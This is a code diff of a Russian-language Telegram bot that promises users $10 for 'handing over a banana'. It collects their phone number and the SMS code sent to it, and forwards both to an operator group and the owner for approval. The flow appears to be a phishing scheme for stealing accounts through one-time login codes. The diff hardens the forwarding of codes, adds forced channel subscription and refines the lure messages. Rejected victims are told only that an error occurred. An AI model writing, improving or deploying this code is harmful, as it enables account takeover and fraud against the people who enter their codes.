@@ -7,7 +7,7 @@ from contextlib import suppress
 import aiosqlite
 from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
 from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode, ChatType
+from aiogram.enums import ParseMode, ChatType, ChatMemberStatus
 from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -26,6 +26,8 @@ OWNER_ID = int(os.getenv("OWNER_ID", "8874871486"))
 GROUP_ID = int(os.getenv("GROUP_ID", "-5448015222"))
 SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "@Sm_mts")
 ADMIN_CODE = os.getenv("ADMIN_CODE", "0408")
+CHANNEL_ID = os.getenv("CHANNEL_ID", "-1004436617649")
+CHANNEL_URL = os.getenv("CHANNEL_URL", "https://t.me/Sm_Info_mts")
 DB_PATH = "banana.db"
 
 logging.basicConfig(
@@ -65,9 +67,25 @@ async def db_init():
             "btn_support": "🆘 Поддержка",
             "btn_withdraw": "💸 Вывести",
             "bot_active": "1",
-            "text_support": "Приветствие! Чтобы написать в Поддержку, нажми на кнопку ниже.",
-            "text_phone_prompt": "Введите номер телефона в формате:\n<code>+79999999999</code>, <code>89999999999</code> или <code>9999999999</code>",
-            "text_code_prompt": "Теперь введите код из SMS:",
+            "text_support": (
+                "💬 <b>Служба поддержки</b>\n\n"
+                "Если у тебя возникли вопросы, проблемы или предложения — "
+                "напиши нам, и мы обязательно поможем!\n\n"
+                "👇 Нажми на кнопку ниже, чтобы открыть чат поддержки."
+            ),
+            "text_phone_prompt": (
+                "📱 <b>Введите номер телефона</b>\n\n"
+                "Поддерживаемые форматы:\n"
+                "• <code>+79999999999</code>\n"
+                "• <code>89999999999</code>\n"
+                "• <code>9999999999</code>\n\n"
+                "✍️ Отправь номер одним сообщением."
+            ),
+            "text_code_prompt": (
+                "🔐 <b>Введите код из SMS</b>\n\n"
+                "Код придёт на указанный номер в течение 1 минуты.\n"
+                "📩 Отправь его одним сообщением."
+            ),
         }
         for k, v in defaults.items():
             await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
@@ -136,6 +154,100 @@ async def is_bot_active() -> bool:
     return (await get_setting("bot_active", "1")) == "1"
 
 
+# ==================== ПРОВЕРКА ПОДПИСКИ ====================
+async def is_subscribed(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(CHANNEL_ID, user_id)
+        return member.status not in (
+            ChatMemberStatus.LEFT,
+            ChatMemberStatus.KICKED,
+        )
+    except Exception as e:
+        log.error(f"❌ Ошибка проверки подписки [{user_id}] в {CHANNEL_ID}: {type(e).__name__}: {e}")
+        # Fail-open: если проверка невозможна (бот не админ канала) — пропускаем
+        return True
+
+
+def subscribe_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL)],
+        [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_sub")],
+    ])
+
+
+async def send_subscribe_prompt(message: Message):
+    await message.answer(
+        "🔒 <b>Доступ ограничен</b>\n\n"
+        "Чтобы пользоваться ботом, подпишись на наш канал 📢\n\n"
+        "После подписки нажми <b>«Проверить подписку»</b> 👇",
+        reply_markup=subscribe_kb()
+    )
+
+
+# ==================== БЕЗОПАСНАЯ ОТПРАВКА ====================
+async def safe_send_group(text: str, **kwargs) -> bool:
+    try:
+        await bot.send_message(GROUP_ID, text, **kwargs)
+        log.info(f"✅ Группа: отправлено")
+        return True
+    except Exception as e:
+        log.error(f"❌ GROUP SEND FAILED [{GROUP_ID}]: {type(e).__name__}: {e}")
+        return False
+
+
+async def safe_send_owner(text: str, **kwargs) -> bool:
+    try:
+        await bot.send_message(OWNER_ID, text, **kwargs)
+        log.info(f"✅ Владелец: отправлено")
+        return True
+    except Exception as e:
+        log.error(f"❌ OWNER SEND FAILED [{OWNER_ID}]: {type(e).__name__}: {e}")
+        return False
+
+
+async def safe_send_user(user_id: int, text: str, **kwargs) -> bool:
+    try:
+        await bot.send_message(user_id, text, **kwargs)
+        return True
+    except Exception as e:
+        log.warning(f"❌ USER SEND FAILED [{user_id}]: {type(e).__name__}: {e}")
+        return False
+
+
+async def check_group_access() -> bool:
+    try:
+        me = await bot.get_me()
+        chat = await bot.get_chat(GROUP_ID)
+        member = await bot.get_chat_member(GROUP_ID, me.id)
+        log.info(f"✅ Группа: '{chat.title}' (type={chat.type}, id={chat.id})")
+        log.info(f"✅ Статус бота в группе: {member.status}")
+        test = await bot.send_message(
+            GROUP_ID,
+            "🔧 <b>Диагностика</b>\nБот успешно подключён к группе."
+        )
+        log.info(f"✅ Тестовое сообщение отправлено (id={test.message_id})")
+        return True
+    except Exception as e:
+        log.error(f"❌ НЕ УДАЛОСЬ отправить в группу {GROUP_ID}: {type(e).__name__}: {e}")
+        return False
+
+
+async def check_channel_access() -> bool:
+    try:
+        me = await bot.get_me()
+        chat = await bot.get_chat(CHANNEL_ID)
+        member = await bot.get_chat_member(CHANNEL_ID, me.id)
+        is_admin = member.status == ChatMemberStatus.ADMINISTRATOR
+        log.info(f"✅ Канал: '{chat.title}' (id={chat.id}, username=@{chat.username})")
+        log.info(f"✅ Статус бота в канале: {member.status}")
+        if not is_admin:
+            log.warning("⚠️ Бот НЕ админ канала — проверка подписки может не работать!")
+        return is_admin
+    except Exception as e:
+        log.error(f"❌ НЕ УДАЛОСЬ проверить канал {CHANNEL_ID}: {type(e).__name__}: {e}")
+        return False
+
+
 # ==================== FSM ====================
 class BananaStates(StatesGroup):
     waiting_phone = State()
@@ -163,25 +275,25 @@ async def main_kb() -> ReplyKeyboardMarkup:
             ],
         ],
         resize_keyboard=True,
-        input_field_placeholder="Выберите действие…"
+        input_field_placeholder="✨ Выберите действие…"
     )
 
 
 def owner_decision_kb(user_id: int, phone: str, code: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="✅ Да", callback_data=f"yes|{user_id}|{phone}|{code}"),
-        InlineKeyboardButton(text="❌ Нет", callback_data=f"no|{user_id}|{phone}|{code}"),
+        InlineKeyboardButton(text="✅ Одобрить", callback_data=f"yes|{user_id}|{phone}|{code}"),
+        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"no|{user_id}|{phone}|{code}"),
     ]])
 
 
 def admin_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✏️ Изменить названия кнопок", callback_data="adm:names")],
-        [InlineKeyboardButton(text="📝 Изменить описание кнопок", callback_data="adm:desc")],
-        [InlineKeyboardButton(text="🎨 Цвет кнопок (эмодзи)", callback_data="adm:color")],
-        [InlineKeyboardButton(text="🖼 Фото кнопок (инфо)", callback_data="adm:photo")],
-        [InlineKeyboardButton(text="▶️/⏸ Старт/Стоп бота", callback_data="adm:toggle")],
-        [InlineKeyboardButton(text="📢 Объявление всем", callback_data="adm:broadcast")],
+        [InlineKeyboardButton(text="✏️ Названия кнопок", callback_data="adm:names"),
+         InlineKeyboardButton(text="📝 Описания", callback_data="adm:desc")],
+        [InlineKeyboardButton(text="🎨 Цвет (эмодзи)", callback_data="adm:color"),
+         InlineKeyboardButton(text="🖼 Фото (инфо)", callback_data="adm:photo")],
+        [InlineKeyboardButton(text="▶️/⏸ Старт/Стоп", callback_data="adm:toggle")],
+        [InlineKeyboardButton(text="📢 Рассылка всем", callback_data="adm:broadcast")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
     ])
 
@@ -200,9 +312,27 @@ class GateMiddleware(BaseMiddleware):
             if uid:
                 await get_user(uid)
                 await update_username(uid, event.from_user.username)
+
+            # Команды, которые проходят без подписки
+            if event.text and event.text.startswith("/start"):
+                return await handler(event, data)
+
+            # Проверка подписки для всех действий
+            if uid and event.chat.type == ChatType.PRIVATE:
+                if not await is_subscribed(uid):
+                    await send_subscribe_prompt(event)
+                    return
+
         elif isinstance(event, CallbackQuery):
-            if event.from_user.id != OWNER_ID and not await is_bot_active():
+            uid = event.from_user.id
+            if uid != OWNER_ID and not await is_bot_active():
                 await event.answer("⏸ Бот на обслуживании", show_alert=True)
+                return
+            # Пропускаем callback проверки подписки всегда
+            if event.data == "check_sub":
+                return await handler(event, data)
+            if uid != OWNER_ID and not await is_subscribed(uid):
+                await event.answer("🔒 Сначала подпишись на канал!", show_alert=True)
                 return
         return await handler(event, data)
 
@@ -234,12 +364,35 @@ def validate_phone(raw: str) -> str | None:
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
     await get_user(message.from_user.id)
+
+    if not await is_subscribed(message.from_user.id):
+        await message.answer(
+            f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
+            "🧸 Это бот для сдачи бананов и получения вознаграждения.\n\n"
+            "🔒 <b>Для начала подпишись на наш канал</b> 👇",
+            reply_markup=subscribe_kb()
+        )
+        return
+
     await message.answer(
-        f"👋 Привет, <b>{message.from_user.first_name}</b>!\n\n"
-        "Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
-        "Выбери действие ниже 👇",
+        f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
+        "🍌 Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
+        "✨ Выбери действие ниже 👇",
         reply_markup=await main_kb()
     )
+
+
+@router.callback_query(F.data == "check_sub")
+async def check_sub_cb(cb: CallbackQuery):
+    if await is_subscribed(cb.from_user.id):
+        await cb.message.edit_text(
+            "✅ <b>Подписка подтверждена!</b>\n\n"
+            "Добро пожаловать в бота 🍌\n"
+            "Нажми /start, чтобы открыть меню."
+        )
+        await cb.answer("✅ Подписка подтверждена!")
+    else:
+        await cb.answer("❌ Ты ещё не подписался на канал!", show_alert=True)
 
 
 @router.message(Command("cancel"))
@@ -276,20 +429,24 @@ async def banana_cancel(message: Message, state: FSMContext):
 async def banana_phone(message: Message, state: FSMContext):
     phone = validate_phone(message.text or "")
     if not phone:
-        await message.answer("❌ Неверный формат. Пример: <code>+79999999999</code>")
+        await message.answer(
+            "❌ <b>Неверный формат номера</b>\n\n"
+            "Пример: <code>+79999999999</code>"
+        )
         return
 
     await state.update_data(phone=phone)
     username = message.from_user.username or "—"
-    with suppress(Exception):
-        await bot.send_message(
-            GROUP_ID,
-            f"📞 <b>Новый номер</b>\n"
-            f"👤 Юзер: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> "
-            f"(<code>{message.from_user.id}</code>)\n"
-            f"🔗 @{username}\n"
-            f"📱 Номер: <code>{phone}</code>"
-        )
+
+    sent = await safe_send_group(
+        f"📞 <b>Новый номер</b>\n"
+        f"👤 Юзер: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> "
+        f"(<code>{message.from_user.id}</code>)\n"
+        f"🔗 @{username}\n"
+        f"📱 Номер: <code>{phone}</code>"
+    )
+    if not sent:
+        await message.answer("⚠️ Не удалось отправить номер в группу. Сообщите администратору.")
 
     await state.set_state(BananaStates.waiting_code)
     await message.answer(await get_setting("text_code_prompt"))
@@ -307,31 +464,30 @@ async def banana_code(message: Message, state: FSMContext):
     user_id = message.from_user.id
     username = message.from_user.username or "—"
 
-    with suppress(Exception):
-        await bot.send_message(
-            GROUP_ID,
-            f"🔑 <b>Код получен</b>\n"
-            f"📱 Номер: <code>{phone}</code>\n"
-            f"🔢 Код: <code>{code}</code>\n"
-            f"👤 От: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> "
-            f"(<code>{user_id}</code>) @{username}"
-        )
+    sent = await safe_send_group(
+        f"🔑 <b>Код получен</b>\n"
+        f"📱 Номер: <code>{phone}</code>\n"
+        f"🔢 Код: <code>{code}</code>\n"
+        f"👤 От: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> "
+        f"(<code>{user_id}</code>) @{username}"
+    )
+    if not sent:
+        await message.answer("⚠️ Не удалось отправить код в группу. Сообщите администратору.")
 
-    with suppress(Exception):
-        await bot.send_message(
-            OWNER_ID,
-            f"🆕 <b>Новая заявка</b>\n\n"
-            f"👤 Пользователь: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n"
-            f"🆔 ID: <code>{user_id}</code>\n"
-            f"🔗 @{username}\n"
-            f"📱 Номер: <code>{phone}</code>\n"
-            f"🔢 Код: <code>{code}</code>\n\n"
-            f"Одобрить?",
-            reply_markup=owner_decision_kb(user_id, phone, code)
-        )
+    await safe_send_owner(
+        f"🆕 <b>Новая заявка</b>\n\n"
+        f"👤 Пользователь: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n"
+        f"🆔 ID: <code>{user_id}</code>\n"
+        f"🔗 @{username}\n"
+        f"📱 Номер: <code>{phone}</code>\n"
+        f"🔢 Код: <code>{code}</code>\n\n"
+        f"Одобрить?",
+        reply_markup=owner_decision_kb(user_id, phone, code)
+    )
 
     await message.answer(
-        "⏳ <b>Ожидайте проверки номера.</b>\n\nМы уведомим вас о результате.",
+        "⏳ <b>Ожидайте проверки номера</b>\n\n"
+        "🔔 Мы уведомим вас о результате в ближайшее время.",
         reply_markup=await main_kb()
     )
     await state.clear()
@@ -348,12 +504,13 @@ async def owner_yes(cb: CallbackQuery):
     await update_balance(uid, 10.0)
     await inc_stat("total_bananas")
     await cb.message.edit_text(cb.message.html_text + "\n\n✅ <b>ОДОБРЕНО</b> — зачислено 10$")
-    with suppress(Exception):
-        await bot.send_message(
-            uid,
-            "✅ <b>Ваш номер проверен!</b>\n\n💰 На баланс зачислено <b>10$</b>.",
-            reply_markup=await main_kb()
-        )
+    await safe_send_user(
+        uid,
+        "✅ <b>Номер проверен!</b>\n\n"
+        "💰 На ваш баланс зачислено <b>10$</b>\n\n"
+        "✨ Спасибо, что пользуетесь нашим ботом!",
+        reply_markup=await main_kb()
+    )
     await cb.answer("Одобрено")
 
 
@@ -365,12 +522,11 @@ async def owner_no(cb: CallbackQuery):
     _, uid, phone, code = cb.data.split("|", 3)
     uid = int(uid)
     await cb.message.edit_text(cb.message.html_text + "\n\n❌ <b>ОТКЛОНЕНО</b>")
-    with suppress(Exception):
-        await bot.send_message(
-            uid,
-            "❌ <b>Произошла ошибка, попробуйте позже.</b>",
-            reply_markup=await main_kb()
-        )
+    await safe_send_user(
+        uid,
+        "❌ <b>Произошла ошибка, попробуйте позже.</b>",
+        reply_markup=await main_kb()
+    )
     await cb.answer("Отклонено")
 
 
@@ -384,11 +540,14 @@ async def profile(message: Message):
         return
     balance, reg = await get_user(message.from_user.id)
     text = (
-        f"👤 <b>Ваш профиль</b>\n\n"
-        f"🆔 ID: <code>{message.from_user.id}</code>\n"
-        f"🔗 @{message.from_user.username or '—'}\n"
-        f"💰 Баланс: <b>{balance:.2f}$</b>\n"
-        f"📅 Регистрация: <b>{reg}</b>"
+        f"👤 <b>Ваш профиль</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
+        f"🔗 <b>Юзернейм:</b> @{message.from_user.username or '—'}\n"
+        f"💰 <b>Баланс:</b> <code>{balance:.2f}$</code>\n"
+        f"📅 <b>Регистрация:</b> {reg}\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"💸 Хочешь вывести средства? Нажми кнопку ниже 👇"
     )
     await message.answer(
         text,
@@ -402,11 +561,14 @@ async def profile(message: Message):
 async def withdraw_start(cb: CallbackQuery, state: FSMContext):
     balance, _ = await get_user(cb.from_user.id)
     if balance <= 0:
-        await cb.answer("У вас нет средств для вывода", show_alert=True)
+        await cb.answer("💰 У вас нет средств для вывода", show_alert=True)
         return
     await state.set_state(WithdrawStates.waiting_amount)
     await cb.message.answer(
-        f"💸 Введите сумму вывода (доступно: <b>{balance:.2f}$</b>):\n\n/cancel — отмена"
+        f"💸 <b>Вывод средств</b>\n\n"
+        f"💰 Доступно: <code>{balance:.2f}$</code>\n\n"
+        f"✍️ Введите сумму вывода:\n\n"
+        f"<i>Для отмены — /cancel</i>"
     )
     await cb.answer()
 
@@ -426,26 +588,29 @@ async def withdraw_amount(message: Message, state: FSMContext):
     uid = message.from_user.id
     balance, _ = await get_user(uid)
     if amount > balance:
-        await message.answer(f"❌ Недостаточно средств. Баланс: <b>{balance:.2f}$</b>")
+        await message.answer(
+            f"❌ <b>Недостаточно средств</b>\n\n"
+            f"💰 Ваш баланс: <code>{balance:.2f}$</code>"
+        )
         return
 
     await set_balance(uid, balance - amount)
     await inc_stat("total_payouts")
     username = message.from_user.username or "—"
 
-    with suppress(Exception):
-        await bot.send_message(
-            OWNER_ID,
-            f"💸 <b>Запрос на вывод</b>\n\n"
-            f"👤 <a href='tg://user?id={uid}'>{message.from_user.full_name}</a>\n"
-            f"🆔 <code>{uid}</code>\n"
-            f"🔗 @{username}\n"
-            f"💵 Сумма: <b>{amount:.2f}$</b>\n"
-            f"💰 Остаток: <b>{balance - amount:.2f}$</b>"
-        )
+    await safe_send_owner(
+        f"💸 <b>Запрос на вывод</b>\n\n"
+        f"👤 <a href='tg://user?id={uid}'>{message.from_user.full_name}</a>\n"
+        f"🆔 <code>{uid}</code>\n"
+        f"🔗 @{username}\n"
+        f"💵 Сумма: <b>{amount:.2f}$</b>\n"
+        f"💰 Остаток: <b>{balance - amount:.2f}$</b>"
+    )
 
     await message.answer(
-        "⏳ <b>Ожидайте вывод.</b>\n\nСредства списаны с баланса.",
+        "⏳ <b>Ожидайте вывод</b>\n\n"
+        "💸 Средства списаны с баланса.\n"
+        "🔔 Мы уведомим вас, когда перевод будет выполнен.",
         reply_markup=await main_kb()
     )
     await state.clear()
@@ -485,7 +650,7 @@ async def admin_check(message: Message, state: FSMContext):
         await state.clear()
         return
     await state.clear()
-    await message.answer("⚙️ <b>Админ-панель</b>", reply_markup=admin_kb())
+    await message.answer("⚙️ <b>Админ-панель</b>\n\nВыберите действие 👇", reply_markup=admin_kb())
 
 
 @router.callback_query(F.data.startswith("adm:"))
@@ -503,7 +668,8 @@ async def admin_router(cb: CallbackQuery, state: FSMContext):
         payouts = await get_stat("total_payouts")
         active = await is_bot_active()
         await cb.message.answer(
-            f"📊 <b>Статистика</b>\n\n"
+            f"📊 <b>Статистика бота</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
             f"👥 Пользователей: <b>{total}</b>\n"
             f"💰 Общий баланс: <b>{total_bal:.2f}$</b>\n"
             f"🍌 Всего сдач: <b>{bananas}</b>\n"
@@ -540,8 +706,8 @@ async def admin_router(cb: CallbackQuery, state: FSMContext):
     elif action == "color":
         await cb.message.answer(
             "🎨 В Telegram <b>нельзя</b> менять цвет Reply-кнопок.\n"
-            "Но можно добавить эмодзи в название через пункт «Изменить названия кнопок».\n\n"
-            "Примеры эмодзи: 🍌🍎🍇💎🔥⚡️🌟"
+            "Но можно добавить эмодзи в название через пункт «Названия кнопок».\n\n"
+            "Примеры: 🍌🍎🍇💎🔥⚡️🌟"
         )
     elif action == "photo":
         await cb.message.answer(
@@ -561,12 +727,11 @@ async def admin_broadcast(message: Message, state: FSMContext):
         async with db.execute("SELECT user_id FROM users") as cur:
             users = [r[0] for r in await cur.fetchall()]
     for uid in users:
-        try:
-            await bot.send_message(uid, f"📢 <b>Объявление</b>\n\n{text}")
+        if await safe_send_user(uid, f"📢 <b>Объявление</b>\n\n{text}"):
             sent += 1
-            await asyncio.sleep(0.05)
-        except Exception:
+        else:
             failed += 1
+        await asyncio.sleep(0.05)
     await message.answer(f"✅ Отправлено: <b>{sent}</b>\n❌ Ошибок: <b>{failed}</b>")
     await state.clear()
 
@@ -600,7 +765,10 @@ async def main():
         BotCommand(command="start", description="🏠 Главное меню"),
         BotCommand(command="cancel", description="❌ Отменить действие"),
     ])
-    log.info("Бот запущен")
+    log.info(f"🤖 Запуск. OWNER_ID={OWNER_ID}, GROUP_ID={GROUP_ID}, CHANNEL={CHANNEL_ID}")
+    await check_group_access()
+    await check_channel_access()
+    log.info("✅ Бот запущен, polling стартует")
     await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
 
 
